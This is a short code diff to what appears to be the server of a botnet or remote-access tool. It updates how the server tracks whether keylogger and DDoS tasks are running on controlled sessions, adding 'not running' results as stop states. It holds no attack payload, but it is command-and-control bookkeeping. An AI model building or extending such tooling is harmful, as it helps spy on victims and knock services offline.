@@ -144,19 +144,19 @@ class TaskDAO:
                         elif task.result == "DDoS attack started":
                             session.running = 2
                     elif session.running == 1:
-                        if task.result == "Keylogger stopped":
+                        if task.result == "Keylogger stopped" or task.result == "Keylogger not running":
                             session.running = 0
                         elif task.result == "DDoS attack started":
                             session.running = 3
                     elif session.running == 2:
-                        if task.result == "DDoS attack stopped":
+                        if task.result == "DDoS attack stopped" or task.result == "DDoS attack not running":
                             session.running = 0
                         elif task.result == "Keylogger started":
                             session.running = 3
                     elif session.running == 3:
-                        if task.result == "Keylogger stopped":
+                        if task.result == "Keylogger stopped" or task.result == "Keylogger not running":
                             session.running = 2
-                        elif task.result == "DDoS attack stopped":
+                        elif task.result == "DDoS attack stopped" or task.result == "DDoS attack not running":
                             session.running = 1
         db.session.commit()
         return task_dict
